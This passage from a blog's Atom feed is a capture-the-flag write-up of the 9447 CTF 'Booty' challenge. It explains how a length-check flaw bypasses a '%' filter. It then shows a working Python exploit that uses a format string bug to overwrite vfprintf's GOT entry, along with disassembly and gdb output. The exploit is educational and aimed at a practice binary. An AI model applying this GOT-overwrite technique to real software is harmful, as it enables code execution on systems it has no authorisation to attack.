<p>The flag was <code>ADCTF_Sc4NF_IS_PRe77Y_niCE</code>. In the end, the executable stack turned out to be a red herring and something more unusual was going on. Cool challenge!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[9447 CTF: Booty]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/01/9447-ctf-booty/"/>
    <updated>2014-12-01T20:13:31+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/01/9447-ctf-booty</id>
    <content type="html"><![CDATA[<p>9447 CTF was ran the other day, and while I didn&rsquo;t have a lot of time, I managed to snatch a couple of flags. First one was this pirate-themed Binary Exploitation.</p>

<!--more-->


<p>The binary present some kind of text-based arm-wrestling game. You can enter your name and then you have to fight several opponents. With no obvious buffer overflow / format string vulnerability (<code>%</code> characters are filtered and set to NULL) in sight, I focused on building a script that would win the game for me. After this, it was possible to change the name, and I was hoping a vulnerability would be present there.</p>

<p>The game is quite easy to beat: the next move of the opponent can be predicted from the message the game sends you. So if the output contained &ldquo;is looking exhausted&rdquo;, the next move should be to &ldquo;[p]ush&rdquo;. I whipped up some quick python to do this and which gives command back to the user when it detects that the game is finished. The binary itself was ran with <code>socat</code>:</p>

<pre><code class="bash">bas@tritonal:~/tmp/9447$ socat TCP-LISTEN:7778,fork EXEC:./booty
</code></pre>

<pre><code class="python">#!/usr/bin/python

from socket import *
from time import sleep
import telnetlib, struct

s=socket(AF_INET, SOCK_STREAM)
s.connect(('localhost', 7778))

# wait before continuing, allows attaching with gdb.
raw_input()

# receive banner
print s.recv(1024)
sleep(0.01)

# send name
cmd ="barrebas"
s.send(cmd+"\n")

# try to beat the game
while 1:
    sleep(0.01)

    data = s.recv(1024)

    print data

    # proper responses
    if "LEVEL" in data:
        cmd = "h\n"
    if "exhausted" in data:
        cmd = "p\n"
    if "flex" in data:
        cmd = "h\n"
    if "tense" in data:
        cmd = "r\n"

    # we've won; hand over control
    if "again" in data:
        t = telnetlib.Telnet()
        t.sock = s
        t.interact()

    # game expects input, so send it
    if "&gt;" in data:
        if cmd:
            s.send(cmd)
            cmd = ""
s.close()
</code></pre>

<p>This allows us to win the game and gives us a &ldquo;clue&rdquo; as to where the treasure (flag) is. Furthermore, we can enter a new user name, but again, no obvious vulnerabilities. et0x noticed that once you send a shorter username, part of the previous username shows up. This can be seen below, as the new user name is not <code>KING</code> but <code>KINGebas</code>:</p>

<pre><code class="bash">:: YOU WIN :: YE NOT BE WALKING THE PLANK YET!

                      .ed"""" """$$$$be.
                    -"           ^""**$$$e.
                  ."                   '$$$c
                 /                      "4$$b
                d  3                     $$$$
                $  *                   .$$$$$$
               .$  ^c           $$$$$e$$$$$$$$.
               d$L  4.         4$$$$$$$$$$$$$$b
               $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
   e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$
  z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c
 4$$$$L   \     $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.
 ^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$
   "**$$$ec   "\   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""
         "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"
            ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"
              "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"
                "*$$$  *=%4.$ L L$ P3$$$F $$$P"
                   "$   "%*ebJLzb$e$$$$$b $P"
                     %..      4$$$$$$$$$$ "
                      $$$e   z$$$$$$$$$$%
                       "*$c  "$$$$$$$P"
                        ."""*$$$$$$$$bc
                     .-"    .$***$$$"""*e.
                  .-"    .e$"     "*$c  ^*b.
           .=*""""    .e$*"          "*bc  "*$e..
         .$"        .z*"               ^*$e.   "*****e.
         $$ee$c   .d"                     "*$.        3.
         ^*$E")$..$"                         *   .ee==d%
            $.d$$$*                           *  J$$$e*
             """""                             "$$$"


:: HAIL THE NEW PIRATE KING, barrebas

0xffdd1c3f marks the spot of your treasure!

Would ye like to play again? (y / n):
&gt; 
y   
PIRATE KING's be entitled to change their name:
&gt; &gt; KING

STA:  62, STR: 10 :: KINGebas
STA: 104, STR: 18 :: Vengeful Queen Anne

Vengeful Queen Anne begins to flex their muscles.

Choose an action, [p]ush  [h]old  [r]est:
</code></pre>

<p>I focused on the binary address, but as it turned out, the flag is not being read into the binary! I tried to break on <code>fopen</code>, and search the memory from within <code>gdb</code> for the flag that I planted locally&hellip; but nothing! Inspecting that memory address in <code>gdb</code> showed:</p>

<pre><code class="bash"># bas@tritonal:~/tmp/9447$ gdb -pid `pgrep booty`
...
Stopped reason: SIGINT
0xf7757430 in __kernel_vsyscall ()
gdb-peda$ x/10x 0xffdd1c3f
0xffdd1c3f: 0xdd1c9000  0x000001ff  0xdd1cd800  0x048e51ff
0xffdd1c4f: 0xdd1c9008  0x000001ff  0xdd1d4800  0x048796ff
0xffdd1c5f: 0x73d4e008  0x0499def7
</code></pre>

<p>Nothing there! No string, no flag, nothing! To be honest, I spent quite some time trying to figure out what I was doing wrong. I figured I was to blame and tried to read the address  that is returned after winning on the remote server. I hope the flag would be there. For this, I needed et0x&rsquo;s observation, because it allowed me to bypass the filtering of <code>%</code> characters. The binary filters the characters here:</p>

<pre><code> 80488dd:   80 7a ff 25             cmpb   $0x25,-0x1(%edx)
 80488e1:   74 0d                   je     80488f0 &lt;vfprintf@plt+0x380&gt;
 80488e3:   39 c2                   cmp    %eax,%edx
 80488e5:   75 f1                   jne    80488d8 &lt;vfprintf@plt+0x36
</code></pre>

<p>If it encounters a <code>%</code>, it will stop and set that byte to NULL. However, if we supply a new username that is shorter than the previous one, the program will only check len(username) bytes for <code>%</code> characters. If we supply:</p>

<pre><code>%aa%x%x
</code></pre>

<p>as the first user name and then</p>

<pre><code>bb
</code></pre>

<p>Then the new username will be <code>bba%x%x</code>. All we have to do then is to beat the game once more, so the format string is triggered. That is because the string <code>:: HAIL THE NEW PIRATE KING,</code> is printed separately from the username, which is printed with something like <code>print(username)</code>.</p>

<p>I did all this to print the string at the memory address that is given by the binary&hellip; to no avail. The final piece of the puzzle was the <code>fopen</code> call that opens the file <code>/home/booty/flag</code>:</p>

<pre><code class="bash"> 80487c0:   53                      push   %ebx
 80487c1:   83 ec 10                sub    $0x10,%esp
 80487c4:   68 60 9a 04 08          push   $0x8049a60   # 'r'
 80487c9:   68 61 98 04 08          push   $0x8049861   # "/home/booty/flag"
 80487ce:   e8 6d fd ff ff          call   8048540 &lt;fopen@plt&gt;
 80487d3:   83 c4 10                add    $0x10,%esp
 80487d6:   85 c0                   test   %eax,%eax
 80487d8:   89 c3                   mov    %eax,%ebx
 80487da:   75 19                   jne    80487f5 &lt;vfprintf@plt+0x285&gt;
 80487dc:   eb 33                   jmp    8048811 &lt;vfprintf@plt+0x2a1&gt;
 80487de:   66 90                   xchg   %ax,%ax
 80487e0:   83 ec 08                sub    $0x8,%esp
 80487e3:   0f be d0                movsbl %al,%edx
 80487e6:   ff 35 a4 a1 04 08       pushl  0x804a1a4
 80487ec:   52                      push   %edx
 80487ed:   e8 fe fc ff ff          call   80484f0 &lt;_IO_putc@plt&gt;
 80487f2:   83 c4 10                add    $0x10,%esp
 80487f5:   83 ec 0c                sub    $0xc,%esp
 80487f8:   53                      push   %ebx
 80487f9:   e8 e2 fc ff ff          call   80484e0 &lt;_IO_getc@plt&gt;
 80487fe:   83 c4 10                add    $0x10,%esp
 8048801:   3c ff                   cmp    $0xff,%al
 8048803:   75 db                   jne    80487e0 &lt;vfprintf@plt+0x270&gt;
 8048805:   83 ec 0c                sub    $0xc,%esp
 8048808:   53                      push   %ebx
 8048809:   e8 b2 fc ff ff          call   80484c0 &lt;fclose@plt&gt;
 804880e:   83 c4 10                add    $0x10,%esp
 8048811:   83 ec 0c                sub    $0xc,%esp
 8048814:   6a 00                   push   $0x0
 8048816:   e8 f5 fc ff ff          call   8048510 &lt;exit@plt&gt;
</code></pre>

<p>It seems like this function is never called, yet it does open the flag and spits out the contents. I verified this from within <code>gdb</code> by running <code>set $eip=0x80487c0</code> and then continuing execution. Indeed, it spat out the bogus flag of my local system. I leveraged the string format vulnerability to overwrite a got pointer force the binary to execute that function. I chose to overwrite <code>vfprintf</code>, because that&rsquo;s called a lot by the binary. I needed to overwrite this pointer in two steps. First, the lower two bytes are overwritten with <code>0x87c0</code>. Then the higher two bytes are overwritten with <code>0x0804</code>. When the binary then wants to call <code>vfprintf</code>, code execution is redirected to <code>0x80487c0</code>!</p>

<p>The exploit now sends the first username: <code>cmd ="%AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%34719c%36$hn%32836c%37$n"</code>. This contains the <code>%</code> character and the rest of the format string. I found the proper offset for the direct addressing (<code>%36$hn</code>) simply by trying a few values together with a name that contained &ldquo;AAAABBBBCCCC&rdquo; blocks. The rest of the padding (<code>%34719c</code> for instance) is simply by running <code>gdb</code> and taking note of the address where the binary crashes. Adding the right amount of padding, observing the crash again, etc.</p>

<p>The final exploit:</p>

<pre><code class="python">#!/usr/bin/python

from socket import *
from time import sleep
import telnetlib, struct

s=socket(AF_INET, SOCK_STREAM)
s.connect(('localhost', 7778))

# wait before continuing, allows attaching with gdb.
raw_input()

# receive banner
print s.recv(1024)
sleep(0.01)

# send string format name
cmd ="%AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%34719c%36$hn%32836c%37$n"

s.send(cmd+"\n")

# try to beat the game
while 1:
    sleep(0.01)

    data = s.recv(1024)

    print data

    # proper responses
    if "LEVEL" in data:
        cmd = "h\n"
    if "exhausted" in data:
        cmd = "p\n"
    if "flex" in data:
        cmd = "h\n"
    if "tense" in data:
        cmd = "r\n"

    # we've won; update name to activate string format bug
    if "again" in data:
        # 0x804a138: vfprintf@got.plt
        # we overwrite it in two parts, the first uses %hn to write two bytes to the lower part of the address
        # the second %n overwrites four bytes, but I don't really care.
        # the rest of the string format bug is: "%34719c%36$hn%32836c%37$n"
        cmd = "ya0AAAAAAAAAAAAAAAAAAAAAAA" + struct.pack("&lt;L", 0x804a138) + struct.pack("&lt;L", 0x804a13a) + "\n"

    # flag is in the input, so halt execution &amp; take note of it!
    if "9447" in data:
        raw_input()

    # game expects input, so send it
    if "&gt;" in data:
        if cmd:
            s.send(cmd)
            cmd = ""
s.close()
</code></pre>

<p>The real flag was something like <code>9447{YOHOHO_A_PIRATES_LIFE_FOR_ME}</code>.</p>
]]></content>
  </entry>
  
</feed>
